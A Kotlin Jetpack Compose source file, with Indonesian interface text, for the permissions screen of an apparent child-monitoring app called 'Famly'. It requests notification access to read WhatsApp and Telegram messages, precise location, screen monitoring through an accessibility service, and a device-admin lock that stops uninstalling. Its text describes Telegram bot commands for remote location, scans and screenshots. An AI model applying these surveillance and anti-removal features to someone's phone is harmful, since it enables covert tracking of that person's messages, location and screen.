package com.example.ui

import android.content.Intent
import android.provider.Settings
import android.widget.Toast
import androidx.compose.animation.AnimatedVisibility
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.shape.CircleShape
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Autorenew
import androidx.compose.material.icons.filled.BatteryChargingFull
import androidx.compose.material.icons.filled.Bluetooth
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Info
import androidx.compose.material.icons.filled.LocationOn
import androidx.compose.material.icons.filled.Notifications
import androidx.compose.material.icons.filled.Security
import androidx.compose.material.icons.filled.Shield
import androidx.compose.material.icons.filled.Visibility
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material.icons.filled.Wifi
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Card
import androidx.compose.material3.CardDefaults
import androidx.compose.material3.Icon
import androidx.compose.material3.LinearProgressIndicator
import androidx.compose.material3.MaterialTheme
import androidx.compose.material3.OutlinedButton
import androidx.compose.material3.Surface
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.vector.ImageVector
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.service.FamlyAccessibilityService
import com.example.ui.theme.MinimalBorder
import com.example.ui.theme.MinimalCardBackground
import com.example.ui.theme.MinimalDarkBackground
import com.example.ui.theme.MinimalEmerald
import com.example.ui.theme.MinimalLavenderPrimary
import com.example.ui.theme.MinimalRose
import com.example.ui.theme.MinimalRoseText
import com.example.ui.theme.MinimalSurfaceElevated
import com.example.ui.theme.MinimalTextMuted
import com.example.ui.theme.MinimalTextPrimary
import com.example.ui.theme.MinimalTextSecondary

import androidx.compose.material.icons.filled.AdminPanelSettings

@Composable
fun PermissionsScreen(
    hasNotificationAccess: Boolean,
    hasLocationPermission: Boolean,
    hasBackgroundLocationPermission: Boolean,
    isIgnoringBatteryOptimizations: Boolean,
    isDeviceAdminActive: Boolean = false,
    onRequestDeviceAdmin: () -> Unit = {},
    onOpenNotificationSettings: () -> Unit,
    onRequestSystemPermissions: () -> Unit,
    onRequestBatteryOptimization: () -> Unit,
    onOpenAutostart: () -> Unit
) {
    val context = LocalContext.current
    val hasAccessibilityPermission = FamlyAccessibilityService.isAccessibilityPermissionGranted(context)

    // Calculate Granted Count
    val grantedCount = listOf(
        hasNotificationAccess,
        hasLocationPermission,
        hasBackgroundLocationPermission,
        isIgnoringBatteryOptimizations,
        hasAccessibilityPermission,
        isDeviceAdminActive
    ).count { it } + 1 // +1 for basic network/system permissions

    val totalCount = 7
    val progress = grantedCount.toFloat() / totalCount.toFloat()
    val isFullyConfigured = grantedCount == totalCount

    LazyColumn(
        modifier = Modifier
            .fillMaxSize()
            .background(MinimalDarkBackground)
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        // Top Header Banner Card
        item {
            Card(
                colors = CardDefaults.cardColors(containerColor = MinimalCardBackground),
                shape = RoundedCornerShape(20.dp),
                border = BorderStroke(1.dp, MinimalLavenderPrimary.copy(alpha = 0.3f)),
                modifier = Modifier.fillMaxWidth()
            ) {
                Column(modifier = Modifier.padding(20.dp)) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        horizontalArrangement = Arrangement.SpaceBetween,
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Box(
                                modifier = Modifier
                                    .size(44.dp)
                                    .clip(CircleShape)
                                    .background(MinimalLavenderPrimary.copy(alpha = 0.15f)),
                                contentAlignment = Alignment.Center
                            ) {
                                Icon(
                                    imageVector = Icons.Default.Shield,
                                    contentDescription = null,
                                    tint = MinimalLavenderPrimary,
                                    modifier = Modifier.size(24.dp)
                                )
                            }
                            Spacer(modifier = Modifier.width(12.dp))
                            Column {
                                Text(
                                    text = "Pusat Izin Akses System",
                                    style = MaterialTheme.typography.titleMedium,
                                    fontWeight = FontWeight.Bold,
                                    color = MinimalTextPrimary
                                )
                                Text(
                                    text = "Konfigurasi Terpadu",
                                    style = MaterialTheme.typography.bodySmall,
                                    color = MinimalTextSecondary
                                )
                            }
                        }

                        Surface(
                            color = if (isFullyConfigured) MinimalEmerald.copy(alpha = 0.15f) else Color(0xFFFFB74D).copy(alpha = 0.15f),
                            shape = RoundedCornerShape(12.dp),
                            border = BorderStroke(1.dp, if (isFullyConfigured) MinimalEmerald else Color(0xFFFFB74D))
                        ) {
                            Text(
                                text = if (isFullyConfigured) "100% SIAP" else "$grantedCount/$totalCount AKTIF",
                                fontSize = 11.sp,
                                fontWeight = FontWeight.Bold,
                                color = if (isFullyConfigured) MinimalEmerald else Color(0xFFFFB74D),
                                modifier = Modifier.padding(horizontal = 10.dp, vertical = 4.dp)
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(16.dp))

                    Text(
                        text = "Aktifkan semua izin di bawah ini agar aplikasi dapat merekam notifikasi, merespons perintah Telegram (/lokasi & /scan), serta berjalan stabil 24/7 di latar belakang.",
                        style = MaterialTheme.typography.bodySmall,
                        color = MinimalTextSecondary,
                        lineHeight = 18.sp
                    )

                    Spacer(modifier = Modifier.height(14.dp))

                    LinearProgressIndicator(
                        progress = { progress },
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(8.dp)
                            .clip(RoundedCornerShape(4.dp)),
                        color = if (isFullyConfigured) MinimalEmerald else MinimalLavenderPrimary,
                        trackColor = MinimalSurfaceElevated
                    )

                    Spacer(modifier = Modifier.height(16.dp))

                    Button(
                        onClick = onRequestSystemPermissions,
                        colors = ButtonDefaults.buttonColors(
                            containerColor = MinimalLavenderPrimary,
                            contentColor = Color(0xFF381E72)
                        ),
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier.fillMaxWidth()
                    ) {
                        Icon(Icons.Default.Security, contentDescription = null, modifier = Modifier.size(18.dp))
                        Spacer(modifier = Modifier.width(8.dp))
                        Text(
                            text = "Minta Semua Izin Sekaligus",
                            fontWeight = FontWeight.Bold,
                            fontSize = 13.sp
                        )
                    }
                }
            }
        }

        // Section Label
        item {
            Text(
                text = "DAFTAR IZIN TERTERA",
                style = MaterialTheme.typography.labelSmall,
                color = MinimalLavenderPrimary,
                fontWeight = FontWeight.Bold,
                letterSpacing = 1.sp,
                modifier = Modifier.padding(start = 4.dp)
            )
        }

        // Permission Card 1: Notification Listener
        item {
            PermissionCardItem(
                title = "1. Akses Listener Notifikasi",
                category = "Notifikasi & Pesan",
                description = "Diperlukan untuk membaca notifikasi masuk WhatsApp, Telegram, dan aplikasi sistem secara otomatis.",
                isGranted = hasNotificationAccess,
                icon = Icons.Default.Notifications,
                buttonText = if (hasNotificationAccess) "Kelola Izin Notifikasi" else "Aktifkan Akses Notifikasi",
                onClickAction = onOpenNotificationSettings
            )
        }

        // Permission Card 2: GPS & Location
        item {
            PermissionCardItem(
                title = "2. Akses Lokasi Presisi GPS",
                category = "Lokasi & Peta",
                description = "Diperlukan untuk merespons perintah Telegram /lokasi dan memberikan kordinat GPS tepat secara realtime.",
                isGranted = hasLocationPermission,
                icon = Icons.Default.LocationOn,
                buttonText = if (hasLocationPermission) "Perbarui Izin Lokasi" else "Izinkan Lokasi Presisi",
                onClickAction = onRequestSystemPermissions
            )
        }

        // Permission Card 3: Wi-Fi & Bluetooth Scanning
        item {
            PermissionCardItem(
                title = "3. Pemindaian Sinyal Wi-Fi & Bluetooth",
                category = "Jaringan & Sinyal",
                description = "Diperlukan oleh Android untuk memindai pemancar Wi-Fi dan perangkat Bluetooth sekitar via perintah Telegram /scan.",
                isGranted = hasLocationPermission, // Wi-Fi & BT scan requires location permission on Android
                icon = Icons.Default.Wifi,
                buttonText = if (hasLocationPermission) "Izin Pemindaian Aktif" else "Izinkan Pemindaian Sinyal",
                onClickAction = onRequestSystemPermissions
            )
        }

        // Permission Card 4: Battery Optimization Unrestricted
        item {
            PermissionCardItem(
                title = "4. Pengecualian Penghemat Baterai",
                category = "Latar Belakang (24/7)",
                description = "Mencegah OS Android mematikan atau membekukan perekam dan layanan bot Telegram saat HP tidur / layar mati.",
                isGranted = isIgnoringBatteryOptimizations,
                icon = Icons.Default.BatteryChargingFull,
                buttonText = if (isIgnoringBatteryOptimizations) "Baterai Bebas Pembatasan" else "Abaikan Penghemat Baterai",
                onClickAction = onRequestBatteryOptimization
            )
        }

        // Permission Card 5: Accessibility Service
        item {
            PermissionCardItem(
                title = "5. Layanan Aksesibilitas (Pemantauan Real-Time)",
                category = "Pemantauan Aplikasi & Layar",
                description = "Diperlukan untuk membaca aplikasi apa yang sedang dibuka anak di layar secara real-time dan merespons perintah Telegram /screenshot & /app.",
                isGranted = hasAccessibilityPermission,
                icon = Icons.Default.Visibility,
                buttonText = if (hasAccessibilityPermission) "Aksesibilitas Aktif" else "Aktifkan Izin Aksesibilitas",
                onClickAction = {
                    try {
                        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        context.startActivity(intent)
                    } catch (e: Exception) {
                        Toast.makeText(context, "Buka Pengaturan HP > Aksesibilitas > Cari Layanan Famly", Toast.LENGTH_LONG).show()
                    }
                }
            )
        }

        // Permission Card 6: OEM Autostart
        item {
            PermissionCardItem(
                title = "6. Mulai Otomatis (OEM Autostart)",
                category = "Sistem Boot",
                description = "Diperlukan khusus pengguna Xiaomi, Vivo, Oppo, Realme, dan Samsung agar aplikasi otomatis aktif setelah HP di-restart.",
                isGranted = true, // System setting screen check
                icon = Icons.Default.Autorenew,
                buttonText = "Kelola Autostart OEM",
                onClickAction = onOpenAutostart,
                isInfoOnly = true
            )
        }

        // Permission Card 7: Device Administrator (Anti-Uninstall)
        item {
            PermissionCardItem(
                title = "7. Proteksi Anti-Uninstall (Device Admin)",
                category = "Keamanan & Penguncian Sistem",
                description = "Mengunci dan menonaktifkan tombol 'Copot Pemasangan' / 'Uninstall' di Android agar aplikasi tidak bisa dihapus oleh anak.",
                isGranted = isDeviceAdminActive,
                icon = Icons.Default.AdminPanelSettings,
                buttonText = if (isDeviceAdminActive) "Proteksi Terkunci (Aktif)" else "Aktifkan Anti-Uninstall",
                onClickAction = onRequestDeviceAdmin
            )
        }

        item {
            Spacer(modifier = Modifier.height(20.dp))
        }
    }
}

@Composable
fun PermissionCardItem(
    title: String,
    category: String,
    description: String,
    isGranted: Boolean,
    icon: ImageVector,
    buttonText: String,
    onClickAction: () -> Unit,
    isInfoOnly: Boolean = false
) {
    Card(
        colors = CardDefaults.cardColors(containerColor = MinimalCardBackground),
        shape = RoundedCornerShape(16.dp),
        border = BorderStroke(1.dp, MinimalBorder),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(
                modifier = Modifier.fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically,
                horizontalArrangement = Arrangement.SpaceBetween
            ) {
                Row(
                    verticalAlignment = Alignment.CenterVertically,
                    modifier = Modifier.weight(1f)
                ) {
                    Box(
                        modifier = Modifier
                            .size(38.dp)
                            .clip(CircleShape)
                            .background(MinimalSurfaceElevated),
                        contentAlignment = Alignment.Center
                    ) {
                        Icon(
                            imageVector = icon,
                            contentDescription = null,
                            tint = MinimalLavenderPrimary,
                            modifier = Modifier.size(20.dp)
                        )
                    }

                    Spacer(modifier = Modifier.width(12.dp))

                    Column {
                        Text(
                            text = title,
                            style = MaterialTheme.typography.bodyMedium,
                            fontWeight = FontWeight.Bold,
                            color = MinimalTextPrimary
                        )
                        Text(
                            text = category,
                            style = MaterialTheme.typography.bodySmall,
                            color = MinimalTextMuted
                        )
                    }
                }

                Surface(
                    color = if (isGranted) MinimalEmerald.copy(alpha = 0.15f) else MinimalRose.copy(alpha = 0.15f),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Row(
                        modifier = Modifier.padding(horizontal = 8.dp, vertical = 4.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Icon(
                            imageVector = if (isGranted) Icons.Default.CheckCircle else Icons.Default.Warning,
                            contentDescription = null,
                            tint = if (isGranted) MinimalEmerald else MinimalRoseText,
                            modifier = Modifier.size(12.dp)
                        )
                        Spacer(modifier = Modifier.width(4.dp))
                        Text(
                            text = if (isGranted) "AKTIF" else "PERLU IZIN",
                            fontSize = 10.sp,
                            fontWeight = FontWeight.Bold,
                            color = if (isGranted) MinimalEmerald else MinimalRoseText
                        )
                    }
                }
            }

            Spacer(modifier = Modifier.height(10.dp))

            Text(
                text = description,
                style = MaterialTheme.typography.bodySmall,
                color = MinimalTextSecondary,
                lineHeight = 16.sp
            )

            Spacer(modifier = Modifier.height(12.dp))

            if (isGranted && !isInfoOnly) {
                OutlinedButton(
                    onClick = onClickAction,
                    colors = ButtonDefaults.outlinedButtonColors(contentColor = MinimalTextPrimary),
                    border = BorderStroke(1.dp, MinimalBorder),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(text = buttonText, fontSize = 11.sp)
                }
            } else {
                Button(
                    onClick = onClickAction,
                    colors = ButtonDefaults.buttonColors(
                        containerColor = if (isInfoOnly) MinimalSurfaceElevated else MinimalLavenderPrimary,
                        contentColor = if (isInfoOnly) MinimalTextPrimary else Color(0xFF381E72)
                    ),
                    shape = RoundedCornerShape(10.dp),
                    modifier = Modifier.fillMaxWidth()
                ) {
                    Text(text = buttonText, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                }
            }
        }
    }
}
